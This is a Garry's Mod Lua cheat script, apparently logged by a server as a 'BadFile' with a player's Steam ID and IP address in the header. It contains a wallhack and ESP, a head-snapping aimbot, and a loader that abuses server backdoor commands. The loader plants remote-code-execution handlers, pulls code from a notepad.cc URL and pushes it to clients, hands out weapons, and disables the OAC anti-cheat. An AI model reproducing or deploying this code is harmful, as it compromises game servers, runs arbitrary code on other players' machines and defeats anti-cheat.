--[[
	MOD/lua/rp.lua
	псевдоник | STEAM_0:0:19009910 <95.221.235.217:27005> | [24-11-13 10:03:16AM]
	===BadFile===
]]




local tblFonts = { }
tblFonts["MenuLarge"] = {
    font = "Verdana",
    size = 17,
    weight = 600,
    antialias = true,
}
for k,v in SortedPairs( tblFonts ) do
    surface.CreateFont( k, tblFonts[k] )
end

surface.CreateFont ("MeBasta", {
        size = 19,
        weight = 1337,
        antialias = true,
        shadow = true,
        font = "TabLarge"}) 
surface.CreateFont("Basta", {
	size = 15,
	weight = 500,
	antialias = true,
	shadow = false,
	font = "ChatFont"})
CreateClientConVar("jonny21_var", "nolag", false, false)
CreateClientConVar("jonny21_person", "1", false, false)
PLAYER=LocalPlayer()
hook.Add("CalcView","lalsa11",function( player, pos, angles, fov )
          if GetConVarNumber("jonny21_person") == 1 and LocalPlayer():Alive() then
        local STOOD = {}
		if PLAYER!=LocalPlayer() then 
		pos=PLAYER:GetPos()+Vector(0,0,60) 
		angles=LocalPlayer():GetAngles() 
		end
        STOOD.origin = pos-(angles:Forward()*45 + angles:Right()*-15 + angles:Up()*-2)
        STOOD.angles = angles
        STOOD.fov = fov
         
        local CROUCH = {}
        CROUCH.origin = pos-(angles:Forward()*25 + angles:Right()*-15 + angles:Up()*-25)
        CROUCH.angles = angles
        CROUCH.fov = fov
         
         
 
    if ( LocalPlayer():OnGround() && LocalPlayer():KeyDown(IN_DUCK)) then
            return CROUCH
    else return STOOD 
 
    end
 end
end)
  
hook.Add("ShouldDrawLocalPlayer", "DrawLocalPlayer", function( player )
    if GetConVarNumber("jonny21_person") == 1 and LocalPlayer():Alive() then     return true end
end)


CreateClientConVar("jonny21_whweap", "0", false, false)

hook.Add( "HUDPaint", "TeamSeen", function()   
Cross()
for k,v in pairs ( player.GetAll() ) do
local Position = ( v:GetPos() + Vector( 0,0,80 ) ):ToScreen()
local Name = ""
local Team = ""
local Team2=""
if v == LocalPlayer() then Name = ""  Team = "" Team2="" else 
Name = v:Name() Team= tostring(v:Health()) if IsValid(v:GetActiveWeapon()) then Team2=v:GetActiveWeapon():GetClass() end
end 
local Col=Color(255,180,0)
 if v:GetFriendStatus() == "friend" then 
Col=Color(0,255,0)
elseif v:IsAdmin() then
 Col=Color(255,255,255)
 if v:IsSuperAdmin() then  Col=Color(255,0,0) end
 end
draw.DrawText( Name, "MeBasta", Position.x, Position.y, Col, 1 )
draw.DrawText( Team, "MeBasta", Position.x, Position.y+15, Col, 1 )
draw.DrawText( Team2, "MeBasta", Position.x, Position.y+30, Col, 1 )

-- draw.DrawText(Team, "MenuLarge", Position.x, Position.y+15, team.GetColor(v:Team()) , 1 )
end

for i,v in pairs(ents.GetAll()) do if string.find(v:GetClass(),"C4") then 
local Position = ( v:GetPos() + Vector( 0,0,10 ) ):ToScreen()
draw.DrawText(v:GetClass(), "MenuLarge", Position.x, Position.y,Color(255,0,0), 1 )
end
end

for i,v in pairs(ents.GetAll()) do if string.find(v:GetClass(),"printer") then 
local Position = ( v:GetPos() + Vector( 0,0,10 ) ):ToScreen()
draw.DrawText(v:GetClass(), "MenuLarge", Position.x, Position.y,Color(255,0,0), 1 )
end
if GetConVarNumber("jonny21_whweap") == 1 then 

if  string.find(v:GetClass(),"class") or string.find(v:GetClass(),"prop")  or string.find(v:GetClass(),"func") or string.find(v:GetClass(),"beam")  or string.find(v:GetClass(),"env") or string.find(v:GetClass(),"zomb") or string.find(v:GetClass(),"fur")  or string.find(v:GetClass(),"weapon") or string.find(v:GetClass(),"player") then  else
local Position = ( v:GetPos() + Vector( 0,0,10 ) ):ToScreen()
draw.DrawText(v:GetClass(), "MenuLarge", Position.x, Position.y,Color(255,0,0), 1 )
end
end
end

end )


function Cross()


																local x, y = ScrW() / 2, ScrH() / 2    
                                                                local Speed = 1
                                                                surface.SetDrawColor(Color(255,160,0))
                                                                CHPosx = math.Clamp(LocalPlayer():GetEyeTrace().HitPos:ToScreen().x,0,ScrW())
                                                                CHPosy = math.Clamp(LocalPlayer():GetEyeTrace().HitPos:ToScreen().y,0,ScrH())
                                                                mathsin = math.sin(CurTime()*Speed)*4
                                                                mathcos = math.cos(CurTime()*Speed)*4
                                                                mathsin2 = math.sin(CurTime()*Speed+0.1)*4
                                                                mathcos2 = math.cos(CurTime()*Speed+0.1)*4
                                                                mathsin3 = math.sin(CurTime()*Speed-0.1)*4
                                                                mathcos3 = math.cos(CurTime()*Speed-0.1)*4
                                                                surface.DrawLine( CHPosx+mathcos*2,CHPosy+mathsin*2,CHPosx+mathcos*5,CHPosy+mathsin*5 );
                                                                surface.DrawLine( CHPosx-mathcos*2,CHPosy-mathsin*2,CHPosx-mathcos*5,CHPosy-mathsin*5 );
                                                                surface.DrawLine( CHPosx+mathsin*2,CHPosy-mathcos*2,CHPosx+mathsin*5,CHPosy-mathcos*5 );
                                                                surface.DrawLine( CHPosx-mathsin*2,CHPosy+mathcos*2,CHPosx-mathsin*5,CHPosy+mathcos*5 );
																

end



function aimbot()
if LocalPlayer():GetActiveWeapon().Primary then LocalPlayer():GetActiveWeapon().Primary.Recoil = 0   end
	local ply = LocalPlayer()
	local trace = util.GetPlayerTrace( ply )
	local traceRes = util.TraceLine( trace ) 
	if traceRes.HitNonWorld then 
		local target = traceRes.Entity 
		if target:IsPlayer() then

			local targethead = target:LookupBone("ValveBiped.Bip01_Head1") 
			local targetheadpos,targetheadang = target:GetBonePosition(targethead)
			ply:SetEyeAngles((targetheadpos - ply:GetShootPos()):Angle())
		end
	end
end


net.Receive('play',function() PLAYER=net.ReadEntity() end)


hook.Add("Think","Mouse",function() 
local I=0
if input.IsMouseDown(MOUSE_RIGHT) and I==0 then
I=1
hook.Add("Think","aimbot",aimbot) 

elseif LocalPlayer():Alive() and IsValid(LocalPlayer():GetActiveWeapon()) and LocalPlayer():GetActiveWeapon():GetClass()!='rcs_awp' then
I=0
hook.Remove("Think","aimbot")
end 

end)
hook.Remove("Think","aimbot")


function myCommand(player,command,args)
LocalPlayer():ChatPrint("твой ид "..LocalPlayer():EntIndex( ))
end

concommand.Add("getid",myCommand)

function AddChat(text)
  chat.AddText(Color(0,0,0), "[Hackers] ", Color(0,255,0),text) 
  end 
 
 net.Receive('rss2',function() AddChat(net.ReadString()) end)

function OnChatTab( str )
str=LocalPlayer():Nick()..': '..str
for i,v in pairs(player.GetAll()) do if v==LocalPlayer() or v:GetFriendStatus() == "friend" then 
net.Start('rss') net.WriteEntity(v) net.WriteString(str) net.SendToServer() end end
 str=''
 return str;
end
hook.Add('OnChatTab','OnChatTab',OnChatTab)


CreateClientConVar("weapon_type", "weapon_real_cs_ak47", false, false)

function Load()

local Str="concommand.Add('"..GetConVarString('jonny21_var').."', function(ply,cmd,argm) RunString('Me=Entity('..ply:EntIndex( )..') This=Me:GetEyeTrace().Entity '..table.concat(argm))  end)"
RunConsoleCommand('ss_texta',Str)
RunConsoleCommand('presion',Str)
RunConsoleCommand('normlua',Str)
local Chat="util.AddNetworkString( 'rss') util.AddNetworkString( 'rss2') net.Receive('rss',function() local ply=net.ReadEntity() str=net.ReadString() net.Start('rss2') net.WriteString(str) net.Send(ply) end)"
local Lodout="function Mes(ply) ply:Give('"..GetConVar("weapon_type"):GetString().."') for i,v in pairs(ply:GetWeapons()) do v:SetClip1(500) ply:SetAmmo(500,v:GetPrimaryAmmoType()) end end"
local Luapad="util.AddNetworkString( 'rss3') util.AddNetworkString( 'rss4')  net.Receive('rss3',function() local ply=net.ReadEntity() str=net.ReadString() RunString('Me=Entity('..ply:EntIndex( )..') This=Me:GetEyeTrace().Entity '..str) end)"
local SuperCode="MySuperCode='' http.Fetch('http://notepad.cc/kisnexu97', function(cont) S=string.Explode('#S#',cont) MySuperCode=S[2] end)"
--local SuperCode="MySuperCode='' http.Fetch('http://notepad.cc/zbiocheala58', function(cont) S=string.Explode('#S#',cont) MySuperCode=S[2] end)"
local GiveMe="function GiveMe(ply) ply:SendLua([[net.Receive('rss4',function() RunString(net.ReadString()) end)  ]]) net.Start('rss4') net.WriteString(MySuperCode) net.Send(ply) end concommand.Add('giveme3',GiveMe)"
RunConsoleCommand(GetConVarString("jonny21_var"),Chat)
RunConsoleCommand(GetConVarString("jonny21_var"),Lodout)
RunConsoleCommand(GetConVarString("jonny21_var"),Luapad)
RunConsoleCommand(GetConVarString("jonny21_var"),SuperCode)
RunConsoleCommand(GetConVarString("jonny21_var"),GiveMe)
RunConsoleCommand(GetConVarString("jonny21_var"),'net.Receive( OAC.Message,function() end) timer.Destroy([[OACHandler]]) hook.Remove( "PlayerInitialSpawn", "OACPIS") ')
end
concommand.Add("loadl",Load)





/*
local DermaPanel = vgui.Create( "DFrame" )
DermaPanel:SetPos( 250,250 )
DermaPanel:SetSize( 600, 450 )
DermaPanel:SetTitle( "my fucking lua_pad" )
DermaPanel:ShowCloseButton( true )
DermaPanel:SetVisible( true )
DermaPanel.Paint = function()
	draw.RoundedBox( 8, 0, 0, DermaPanel:GetWide(), DermaPanel:GetTall(), Color( 0, 0, 0, 220 ) )
end
DermaPanel:MakePopup()

local DermaPanel2 = vgui.Create( "DFrame",DermaPanel )
DermaPanel2:SetPos( 20,25 )
DermaPanel2:SetSize( 560, 370 )
DermaPanel2:ShowCloseButton(false)
DermaPanel2:SetTitle( "" )
DermaPanel2:SetVisible( true )
DermaPanel2.Paint = function()
	draw.RoundedBox( 8, 0, 0, DermaPanel2:GetWide(), DermaPanel2:GetTall(), Color(70, 70, 70, 220 ) )
end


local DermaText = vgui.Create( "DTextEntry", DermaPanel2 )
DermaText:SetPos( 0,0)
DermaText:SetValue('-- made by me :DD\n')
DermaText:SetTall( 320 )
DermaText:SetMultiline(true)
DermaText:SetWide( 450 )
DermaText:SetTextColor(Color(100,255,0))
DermaText:SetEnterAllowed( true )
DermaText:SetFont("MeBasta")
DermaText:SetDrawBackground(false)

DermaText:SetDrawBorder(true)
DermaText.OnEnter = function()
    Msg("You entered -"..DermaText:GetValue().."-!" ) 
    DermaPanel:SetVisible( false )
	end

	

local DermaButton = vgui.Create( "DButton" )
DermaButton:SetParent( DermaPanel ) 
DermaButton:SetText( "Run" )
DermaButton:SetPos( 0, 400 )
DermaButton:SetSize( 150, 50 )
DermaButton.DoClick = function ()
LocalPlayer():ChatPrint(DermaText:GetValue())
end


local DermaButton2 = vgui.Create( "DButton" )
DermaButton2:SetParent( DermaPanel ) 
DermaButton2:SetText( "Clear" )
DermaButton2:SetPos( 450, 400 )
DermaButton2:SetSize( 150, 50 )
DermaButton2.DoClick = function ()
DermaText:SetValue('-- made by me :DD\n')

end
 */
 
 
concommand.Add('vava', function(ply,cmd,argm) RunString(table.concat(argm))  end)

 --for i,v in pairs(ents.GetAll()) do if IsValid(v) and v:CPPIGetOwner():Nick()=="Jerk" then v:SetColor(Color(0,0,0,0)) end end
 /*
 hook.Add("Think","sasa",function()
  --RunConsoleCommand('stopsound')
 for i=0,500 do
timer.Destroy('AntiBypassAndPropKill'..tostring(i))
end
 end)
 */

/*
 local timer_Create = timer.Create

 function timer.Create( ... )
print( ... )
return timer_Create( ... )
end


timer.Create("lal",1,2,function() end)




*/



